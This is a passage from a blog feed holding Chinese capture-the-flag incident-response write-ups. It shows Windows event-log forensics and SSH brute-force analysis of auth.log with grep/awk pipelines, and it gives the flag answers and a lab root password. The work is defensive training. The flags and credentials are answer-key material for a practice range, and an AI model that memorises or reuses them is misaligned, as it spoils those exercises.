&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320111936.png" alt="Pasted image 20250320111936">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{Adnimistartro}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3&lt;/h2>
&lt;p>&lt;strong>3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；&lt;/strong>&lt;br>
筛选 事件 ID 4663&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320112102.png" alt="Pasted image 20250320112102">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{SCHEMA}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag4">flag4&lt;/h2>
&lt;p>&lt;strong>4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；&lt;/strong>&lt;br>
直接进应用程序.evtx文件里找就行&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320113111.png" alt="Pasted image 20250320113111">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{7036}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag5">flag5&lt;/h2>
&lt;p>&lt;strong>5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。&lt;/strong>&lt;br>
题目说黑客登录系统后修改了登录用户并且进行了多次重启，提交黑客修改用户重启的次数，这里我们需要在系统日志里面进行查看，查看&lt;strong>事件ID 1074&lt;/strong>；&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320131525.png" alt="Pasted image 20250320131525">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{3}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="事件id">事件ID:&lt;/h1>
&lt;p>&lt;strong>事件 ID 4624&lt;/strong> - 成功的账户登录&lt;br>
&lt;strong>事件 ID 4625&lt;/strong> - 登录失败&lt;br>
&lt;strong>事件 ID 4634&lt;/strong> - 用户注销&lt;br>
&lt;strong>事件 ID 4647&lt;/strong> - 用户主动注销&lt;br>
&lt;strong>事件 ID 4720&lt;/strong> - 用户账户已创建&lt;br>
&lt;strong>事件 ID 4722&lt;/strong> - 用户账户已启用&lt;br>
&lt;strong>事件 ID 4725&lt;/strong> - 用户账户已禁用&lt;br>
&lt;strong>事件 ID 4726&lt;/strong> - 用户账户已删除&lt;br>
&lt;strong>事件 ID 4670&lt;/strong> - 权限服务状态变更&lt;br>
&lt;strong>事件 ID 4719&lt;/strong> - 系统审计策略已更改&lt;br>
&lt;strong>事件 ID 6005&lt;/strong> - 事件日志服务启动&lt;br>
&lt;strong>事件 ID 6006&lt;/strong> - 事件日志服务停止&lt;br>
&lt;strong>事件 ID 4672&lt;/strong> - 特权服务已分配&lt;br>
&lt;strong>事件 ID 4673&lt;/strong> - 特权服务已请求&lt;br>
&lt;strong>事件 ID 7036&lt;/strong> - 服务已更改状态&lt;br>
&lt;strong>事件 ID 1074&lt;/strong> - 系统关机,重启或注销&lt;/p></description></item><item><title>【玄机靶场】第一章 应急响应- Linux日志分析</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</guid><description>&lt;img src="http://localhost:1313/images/42.webp" alt="Featured image of post 【玄机靶场】第一章 应急响应- Linux日志分析" />&lt;h1 id="简介">简介&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号root密码linuxrz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">IP&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&amp;quot;,&amp;ldquo;分割&lt;br>
2.ssh爆破成功登陆的IP是多少，如果有多个使用&amp;rdquo;,&amp;ldquo;分割&lt;br>
3.爆破用户名字典是什么？如果有多个使用&amp;rdquo;,&amp;ldquo;分割&lt;br>
4.登陆成功的IP共爆破了多少次&lt;br>
5.黑客登陆主机后新建了一个后门用户，用户名是多少&lt;/p>
&lt;h1 id="开启靶场">开启靶场&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319212211.png" alt="Pasted image 20250319212211">&lt;/p>
&lt;h1 id="过程">过程&lt;/h1>
&lt;h2 id="flag1">flag1&lt;/h2>
&lt;p>&lt;strong>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&amp;rdquo;,&amp;ldquo;分割&lt;/strong>&lt;br>
首先肯定是先找到日志的位置，一般来说，SSH登录尝试会记录在 &lt;code>/var/log/auth.log.1&lt;/code>（这是固定的）&lt;br>
接着那既然是爆破，那肯定会有很多失败的次数对吧？&lt;br>
逻辑基本就是上面这样，如果日志少一些那还好，可以一条条进行分析，日志多的话那可能还要进行筛选；&lt;br>
命令如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password for root&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以看出已给出三个地址：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319212440.png" alt="Pasted image 20250319212440">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="c1"># cat auth.log.1 | grep -a &amp;#34;Failed password for root&amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c | sort -nr | more
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.31&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.31&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.32&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2&lt;/h2>
&lt;p>&lt;strong>2.ssh爆破成功登陆的IP是多少，如果有多个使用&amp;rdquo;,&amp;ldquo;分割&lt;/strong>&lt;br>
其实思路也很简单，那既然上面我们都已经得到三个IP了，最多的次数4次，不用想肯定最可疑啊，直接提交就是：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Accepted &amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>简单来说就是分析&lt;code>auth.log.1&lt;/code>日志文件，提取出所有包含&amp;quot;Accepted &amp;ldquo;字符串的行，然后使用&lt;code>awk&lt;/code>命令提取每行的第11个字段（通常这个字段表示远程IP地址），之后对这些IP地址进行排序和统计，最后按照数量的降序排列，并通过&lt;code>more&lt;/code>命令分页显示结果。&lt;/p>&lt;/blockquote>
&lt;p>这个命令链条通过以下步骤统计每个IP地址成功登录的次数：&lt;/p>
&lt;ol>
&lt;li>读取日志文件并筛选出成功登录的记录。&lt;/li>
&lt;li>提取记录中的IP地址。&lt;/li>
&lt;li>对IP地址进行排序、去重和计数。&lt;/li>
&lt;li>按登录次数降序排列并逐页显示结果。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319212812.png" alt="Pasted image 20250319212812">&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="c1"># cat auth.log.1 | grep -a &amp;#34;Accepted &amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c | sort -nr | more
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag2&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.200.2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3&lt;/h2>
&lt;p>&lt;strong>3.爆破用户名字典是什么？如果有多个使用&amp;rdquo;,&amp;ldquo;分割&lt;/strong>&lt;br>
那做这这种的思路是什么？&lt;br>
那首先我们得了解什么是&lt;strong>爆破用户名字典&lt;/strong>？&lt;br>
简单来说指黑客在进行暴力破解攻击时使用的一系列用户名列表。黑客通过自动化工具逐个尝试这些用户名，结合常见或默认密码，试图找到有效的登录凭据。这个过程被称为“字典攻击”或“暴力破解攻击”。&lt;br>
具体操作步骤；&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">perl&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="s1">&amp;#39;while($_=&amp;lt;&amp;gt;){ /for(.*?) from/; print &amp;#34;$1\n&amp;#34;;}&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319213127.png" alt="Pasted image 20250319213127">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="c1"># cat auth.log.1 | grep -a &amp;#34;Failed password&amp;#34; | perl -e &amp;#39;while($_=&amp;lt;&amp;gt;){ /for(.*?) from/; print &amp;#34;$1\n&amp;#34;;}&amp;#39;|uniq -c|sort -nr
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">5&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">hello&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">5&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">4&lt;/span> &lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">test3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">test2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">test1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag3&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">hello&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">test3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">test2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">test1&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag4">flag4&lt;/h2>
&lt;p>&lt;strong>4.成功登录 root 用户的 ip 一共爆破了多少次&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>这个就更简单了，其实也和上面第一题重复了，因为问题问：有多少IP在爆破主机ssh的root账号？这里又问成功登录 root 用户的 ip 一共爆破了多少次？而且前面我们在统计IP的时候就已经顺便把次数统计出来了，所以PASS，这里没什么好说的；&lt;/p>&lt;/blockquote>
&lt;p>（命令还是第一题的命令，这里只是重复一下，不在多做解释）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="s2">&amp;#34;Failed password for root&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">nr&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">more&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319213422.png" alt="Pasted image 20250319213422">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="c1"># cat auth.log.1 | grep -a &amp;#34;Failed password for root&amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c | sort -nr | more
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">200.31&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag4&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{4}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag5">flag5&lt;/h2>
&lt;p>&lt;strong>5.黑客登陆主机后新建了一个后门用户，用户名是多少&lt;/strong>&lt;br>
这个又是一个新的知识点，问我们黑客登陆主机后新建了一个后门用户，用户名是多少？&lt;br>
那这种我们怎么操作呢？（其实基本也就是这五个步骤）&lt;br>
&lt;strong>步骤1&lt;/strong>：确定日志文件&lt;br>
通常与用户登录和用户管理活动相关的日志文件是 &lt;code>/var/log/auth.log&lt;/code> 或其备份文件如 &lt;code>/var/log/auth.log.1&lt;/code>。&lt;br>
&lt;strong>步骤2&lt;/strong>：搜索创建用户的关键字&lt;br>
